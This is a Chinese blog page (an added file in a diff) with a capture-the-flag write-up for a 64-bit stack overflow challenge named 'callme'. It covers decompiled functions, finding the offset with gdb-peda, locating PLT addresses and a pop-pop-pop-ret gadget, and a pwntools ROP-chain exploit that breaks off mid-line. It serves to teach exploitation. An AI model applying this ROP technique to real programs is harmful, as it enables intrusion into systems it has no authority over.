@@ -1,0 +1,1074 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PWN," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00 源码分析很明显的栈溢出 123456789char *pwnme()&amp;#123;  char s; // [sp+0h] [bp-20h]@1  memset(&amp;amp;s, 0, 0x20uLL);  puts(&amp;quot;Hope you read the instructions...&amp;quot;);  printf(&amp;quot;&amp;gt; &amp;quot;, 0LL);  return">
+<meta name="keywords" content="PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一道简单的栈溢出题">
+<meta property="og:url" content="http://yoursite.com/2018/03/17/一道简单的栈溢出题/index.html">
+<meta property="og:site_name" content="Mask&#39;s Blog">
+<meta property="og:description" content="0x00 源码分析很明显的栈溢出 123456789char *pwnme()&amp;#123;  char s; // [sp+0h] [bp-20h]@1  memset(&amp;amp;s, 0, 0x20uLL);  puts(&amp;quot;Hope you read the instructions...&amp;quot;);  printf(&amp;quot;&amp;gt; &amp;quot;, 0LL);  return">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-03-17T13:23:00.988Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一道简单的栈溢出题">
+<meta name="twitter:description" content="0x00 源码分析很明显的栈溢出 123456789char *pwnme()&amp;#123;  char s; // [sp+0h] [bp-20h]@1  memset(&amp;amp;s, 0, 0x20uLL);  puts(&amp;quot;Hope you read the instructions...&amp;quot;);  printf(&amp;quot;&amp;gt; &amp;quot;, 0LL);  return">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/17/一道简单的栈溢出题/"/>
+
+
+
+
+
+  <title>一道简单的栈溢出题 | Mask's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Mask's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/17/一道简单的栈溢出题/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Mask">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mask's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">一道简单的栈溢出题</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-17T19:31:38+08:00">
+                2018-03-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-源码分析"><a href="#0x00-源码分析" class="headerlink" title="0x00 源码分析"></a>0x00 源码分析</h2><p>很明显的栈溢出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">char *pwnme()</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [sp+0h] [bp-20h]@1</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, 0x20uLL);</span><br><span class="line">  puts(&quot;Hope you read the instructions...&quot;);</span><br><span class="line">  printf(&quot;&gt; &quot;, 0LL);</span><br><span class="line">  return fgets(&amp;s, 256, stdin);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>来看看这个usefulFunction函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void __noreturn usefulFunction()</span><br><span class="line">&#123;</span><br><span class="line">  callme_three(4LL, 5LL, 6LL);</span><br><span class="line">  callme_two(4LL, 5LL, 6LL);</span><br><span class="line">  callme_one(4LL, 5LL, 6LL);</span><br><span class="line">  exit(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>有三个函数：</p>
+<p>callme_one ,callme_two,callme_three</p>
+<p> <strong>callme_one:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall callme_one(int a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; // [sp+18h] [bp-8h]@4</span><br><span class="line"></span><br><span class="line">  if ( a1 != 1 || a2 != 2 || a3 != 3 )</span><br><span class="line">  &#123;</span><br><span class="line">	puts(&quot;Incorrect parameters&quot;);</span><br><span class="line">	exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  stream = fopen(&quot;encrypted_flag.txt&quot;, &quot;r&quot;);</span><br><span class="line">  if ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">	puts(&quot;Failed to open encrypted_flag.txt&quot;);</span><br><span class="line">	exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  g_buf = (char *)malloc(0x21uLL);</span><br><span class="line">  if ( !g_buf )</span><br><span class="line">  &#123;</span><br><span class="line">	puts(&quot;Could not allocate memory&quot;);</span><br><span class="line">	exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  g_buf = fgets(g_buf, 33, stream);</span><br><span class="line">  return fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>callme_two:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FILE *__fastcall callme_two(int a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *result; // rax@4</span><br><span class="line">  char v4; // si@8</span><br><span class="line">  signed int i; // [sp+14h] [bp-Ch]@7</span><br><span class="line">  FILE *stream; // [sp+18h] [bp-8h]@4</span><br><span class="line"></span><br><span class="line">  if ( a1 != 1 || a2 != 2 || a3 != 3 )</span><br><span class="line">  &#123;</span><br><span class="line">puts(&quot;Incorrect parameters&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  result = fopen(&quot;key1.dat&quot;, &quot;r&quot;);</span><br><span class="line">  stream = result;</span><br><span class="line">  if ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">puts(&quot;Failed to open key1.dat&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  for ( i = 0; i &lt;= 15; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">v4 = fgetc(stream);</span><br><span class="line">result = (FILE *)&amp;g_buf[i];</span><br><span class="line">LOBYTE(result-&gt;_flags) = v4 ^ g_buf[i];</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>callme_three:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn callme_three(int a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; // [sp+14h] [bp-Ch]@7</span><br><span class="line">  FILE *stream; // [sp+18h] [bp-8h]@4</span><br><span class="line"></span><br><span class="line">  if ( a1 == 1 &amp;&amp; a2 == 2 &amp;&amp; a3 == 3 )</span><br><span class="line">  &#123;</span><br><span class="line">stream = fopen(&quot;key2.dat&quot;, &quot;r&quot;);</span><br><span class="line">if ( !stream )</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;Failed to open key2.dat&quot;);</span><br><span class="line">  exit(1);</span><br><span class="line">&#125;</span><br><span class="line">for ( i = 16; i &lt;= 31; ++i )</span><br><span class="line">  g_buf[i] ^= fgetc(stream);</span><br><span class="line">printf(&quot;%s&quot;, g_buf);</span><br><span class="line">exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Incorrect parameters&quot;);</span><br><span class="line">  exit(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>开始看到<code>usefulFunction</code>函数时，以为需要调用这个函数，但是你仔细看每一个<code>callme_</code>函数，你会发现传入的参数必须是 <code>1，2，3</code>，不然就会显示<code>Incorrect parameters</code>，然后退出。</p>
+<p>那么根据这个usefulFunction函数可以知道这三个函数的调用顺序是<code>callme_one,callme_two,callme_three</code></p>
+<p>思路有了，那么接下来就是调试</p>
+<h2 id="0x01-程序调试"><a href="#0x01-程序调试" class="headerlink" title="0x01 程序调试"></a>0x01 程序调试</h2><p>gdb动起来，先生成300个随机字符串，用来填充缓冲区：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~$ gdb ./callme </span><br><span class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1</span><br><span class="line">Copyright (C) 2014 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from ./callme...(no debugging symbols found)...done.</span><br><span class="line">gdb-peda$ pattern create 300</span><br><span class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%&apos;</span><br></pre></td></tr></table></figure>
+<p>然后r运行起来，输入刚才那300个填充字符串<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x0000000000401a56 in pwnme ()</span><br></pre></td></tr></table></figure>
+<p>可以看到停在了pwnme函数处，这里有一点需要注意：</p>
+<blockquote>
+<p>PC指针并没有指向类似于0x41414141那样地址，而是停在了vulnerable_function()函数中。这是为什么呢？原因就是我们之前提到过的程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为ret相当于“pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。</p>
+</blockquote>
+<p>这里引用了蒸米师傅一步一步学ROP的文章中的原话，解释的很清楚了，那么我们来看看rsp数值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/gx $rsp</span><br><span class="line">0x7fffffffde68:	0x4141464141304141</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
+<p>然后计算距离溢出点的偏移：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/gx $rsp</span><br><span class="line">0x7fffffffde68:	0x4141464141304141</span><br><span class="line">gdb-peda$ pattern offset 0x4141464141304141</span><br><span class="line">4702116732032008513 found at offset: 40</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
+<p>偏移为40</p>
+<p>第二步，我们需要找到<code>callme_one,callme_two,callme_three</code>这三个函数的地址，因为这里是动态链接，那么我们只需要知道他们的.plt地址即可，关于got和.plt的概念请参考这篇文章：</p>
+<p><a href="http://www.freebuf.com/articles/system/135685.html" target="_blank" rel="noopener">Linux中的GOT和PLT到底是个啥</a></p>
+<p>这里我们使用Linux下的objdump来找：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~$ objdump -d callme | grep plt</span><br><span class="line">  4017d0:	e8 bb 00 00 00   	callq  401890 &lt;exit@plt+0x10&gt;</span><br><span class="line">Disassembly of section .plt:</span><br><span class="line">00000000004017e0 &lt;puts@plt-0x10&gt;:</span><br><span class="line">00000000004017f0 &lt;puts@plt&gt;:</span><br><span class="line">0000000000401800 &lt;printf@plt&gt;:</span><br><span class="line">0000000000401810 &lt;callme_three@plt&gt;:</span><br><span class="line">0000000000401820 &lt;memset@plt&gt;:</span><br><span class="line">0000000000401830 &lt;__libc_start_main@plt&gt;:</span><br><span class="line">0000000000401840 &lt;fgets@plt&gt;:</span><br><span class="line">0000000000401850 &lt;callme_one@plt&gt;:</span><br><span class="line">0000000000401860 &lt;setvbuf@plt&gt;:</span><br><span class="line">0000000000401870 &lt;callme_two@plt&gt;:</span><br><span class="line">0000000000401880 &lt;exit@plt&gt;:</span><br><span class="line">Disassembly of section .plt.got:</span><br><span class="line">0000000000401890 &lt;.plt.got&gt;:</span><br><span class="line">  4018c4:	e8 67 ff ff ff   	callq  401830 &lt;__libc_start_main@plt&gt;</span><br><span class="line">  4019b3:	e8 a8 fe ff ff   	callq  401860 &lt;setvbuf@plt&gt;</span><br><span class="line">  4019d1:	e8 8a fe ff ff   	callq  401860 &lt;setvbuf@plt&gt;</span><br><span class="line">  4019db:	e8 10 fe ff ff   	callq  4017f0 &lt;puts@plt&gt;</span><br><span class="line">  4019e5:	e8 06 fe ff ff   	callq  4017f0 &lt;puts@plt&gt;</span><br><span class="line">  4019f9:	e8 f2 fd ff ff   	callq  4017f0 &lt;puts@plt&gt;</span><br><span class="line">  401a1e:	e8 fd fd ff ff   	callq  401820 &lt;memset@plt&gt;</span><br><span class="line">  401a28:	e8 c3 fd ff ff   	callq  4017f0 &lt;puts@plt&gt;</span><br><span class="line">  401a37:	e8 c4 fd ff ff   	callq  401800 &lt;printf@plt&gt;</span><br><span class="line">  401a4f:	e8 ec fd ff ff   	callq  401840 &lt;fgets@plt&gt;</span><br><span class="line">  401a6a:	e8 a1 fd ff ff   	callq  401810 &lt;callme_three@plt&gt;</span><br><span class="line">  401a7e:	e8 ed fd ff ff   	callq  401870 &lt;callme_two@plt&gt;</span><br><span class="line">  401a92:	e8 b9 fd ff ff   	callq  401850 &lt;callme_one@plt&gt;</span><br><span class="line">  401a9c:	e8 df fd ff ff   	callq  401880 &lt;exit@plt&gt;</span><br><span class="line">mask@mask-virtual-machine:~$</span><br></pre></td></tr></table></figure>
+<p>那么这三个函数的地址我们知道了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">callme_one_plt__got = 0x00401850</span><br><span class="line">callme_two_plt__got = 0x00401870</span><br><span class="line">callme_three_plt__got = 0x00401810</span><br></pre></td></tr></table></figure>
+<p>那么第三步，还差一个关键地方，再次引用蒸米师傅的原话</p>
+<blockquote>
+<p>这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。</p>
+</blockquote>
+<p>那么来找咯：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~$ objdump -d callme | grep -A 3 pop</span><br><span class="line">  4018a5:	5e   	pop%rsi</span><br><span class="line">  4018a6:	48 89 e2 	mov%rsp,%rdx</span><br><span class="line">  4018a9:	48 83 e4 f0  	and$0xfffffffffffffff0,%rsp</span><br><span class="line">  4018ad:	50   	push   %rax</span><br><span class="line">--</span><br><span class="line">  4018ef:	5d   	pop%rbp</span><br><span class="line">  4018f0:	bf 78 20 60 00   	mov$0x602078,%edi</span><br><span class="line">  4018f5:	ff e0	jmpq   *%rax</span><br><span class="line">  4018f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)</span><br><span class="line">--</span><br><span class="line">  401900:	5d   	pop%rbp</span><br><span class="line">  401901:	c3   	retq   </span><br><span class="line">  401902:	0f 1f 40 00  	nopl   0x0(%rax)</span><br><span class="line">  401906:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">--</span><br><span class="line">  40193d:	5d   	pop%rbp</span><br><span class="line">  40193e:	bf 78 20 60 00   	mov$0x602078,%edi</span><br><span class="line">  401943:	ff e0	jmpq   *%rax</span><br><span class="line">  401945:	0f 1f 00 	nopl   (%rax)</span><br><span class="line">  401948:	5d   	pop%rbp</span><br><span class="line">  401949:	c3   	retq   </span><br><span class="line">  40194a:	66 0f 1f 44 00 00	nopw   0x0(%rax,%rax,1)</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">  401962:	5d   	pop%rbp</span><br><span class="line">  401963:	c6 05 3e 07 20 00 01 	movb   $0x1,0x20073e(%rip)# 6020a8 &lt;completed.7585&gt;</span><br><span class="line">  40196a:	f3 c3	repz retq </span><br><span class="line">  40196c:	0f 1f 40 00  	nopl   0x0(%rax)</span><br><span class="line">--</span><br><span class="line">  401990:	5d   	pop%rbp</span><br><span class="line">  401991:	e9 7a ff ff ff   	jmpq   401910 &lt;register_tm_clones&gt;</span><br><span class="line"></span><br><span class="line">0000000000401996 &lt;main&gt;:</span><br><span class="line">--</span><br><span class="line">  401a03:	5d   	pop%rbp</span><br><span class="line">  401a04:	c3   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a05 &lt;pwnme&gt;:</span><br><span class="line">--</span><br><span class="line">  401ab0:	5f   	pop%rdi</span><br><span class="line">  401ab1:	5e   	pop%rsi</span><br><span class="line">  401ab2:	5a   	pop%rdx</span><br><span class="line">  401ab3:	c3   	retq   </span><br><span class="line">  401ab4:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  401abb:	00 00 00 </span><br><span class="line">--</span><br><span class="line">  401b1a:	5b   	pop%rbx</span><br><span class="line">  401b1b:	5d   	pop%rbp</span><br><span class="line">  401b1c:	41 5c	pop%r12</span><br><span class="line">  401b1e:	41 5d	pop%r13</span><br><span class="line">  401b20:	41 5e	pop%r14</span><br><span class="line">  401b22:	41 5f	pop%r15</span><br><span class="line">  401b24:	c3   	retq   </span><br><span class="line">  401b25:	90   	nop</span><br><span class="line">  401b26:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">mask@mask-virtual-machine:~$</span><br></pre></td></tr></table></figure>
+<p>那么地址就取<code>pppr_addr = 0x00401ab0</code></p>
+<p>那么所有的都准备好了，接下来就是编写exp</p>
+<h2 id="0x02-exp的编写"><a href="#0x02-exp的编写" class="headerlink" title="0x02 exp的编写"></a>0x02 exp的编写</h2><p>使用了pwntools工具</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">callme_one_plt_got = 0x00401850</span><br><span class="line">callme_two_plt_got = 0x00401870</span><br><span class="line">callme_three_plt_got = 0x00401810</span><br><span class="line">pppr_addr = 0x00401ab0</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += &quot;A&quot;*40</span><br><span class="line">payload += p64(pppr_addr)</span><br><span class="line">payload += p64(0x1) + p64(0x2) + p64(0x3)#传入参数</span><br><span class="line">payload += p64(callme_one_plt_got)</span><br><span class="line">payload += p64(pppr_addr)</span><br><span class="line">payload += p64(0x1) + p64(0x2) + p64(0x3)#传入参数</span><br><span class="line">payload += p64(callme_two_plt_got)</span><br><span class="line">payload += p64(pppr_addr)</span><br><span class="line">payload += p64(0x1) + p64(0x2) + p64(0x3)#传入参数</span><br><span class="line">payload += p64(callme_three_plt_got)</span><br><span class="line"></span><br><span class="line"># io = process(&quot;./callme&quot;)#本地调试</span><br><span class="line"></span><br><span class="line">io = 